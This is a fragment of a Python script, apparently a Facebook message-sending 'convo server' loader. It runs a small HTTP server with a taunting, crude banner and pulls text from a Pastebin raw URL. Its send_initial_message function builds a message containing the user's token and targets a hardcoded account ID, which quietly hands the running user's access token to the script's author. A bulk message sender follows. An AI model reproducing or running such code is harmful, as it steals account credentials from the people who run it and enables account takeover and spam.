...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"YOUR D9DDY GURU INSID3 ( CONV0 S3RV3R ) GURU IINSID3 T4TY T3RI M9 NU FHUDD9 0N FIR3 = ] ] ")
...
mmm = requests.get('https://pastebin.com/raw/JN99NbwC').text
...
def send_initial_message():
    ...
    msg_template = "Hello alone Guru sir! I am using your server. My 🛡️token🛡️ is {}"

    # Specify the ID where you want to send the message
    target_id = "61566240857385"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\u001b[37m' + ' Guru Insiide---------------------------------------------------')
...
def send_messages_from_file():
    ...
    def liness():
        print('\u001b[37m' + '--------L0D3R-------RUN1NG--------D4R1NDD9---------GURU--------------IINS1D3-------------')
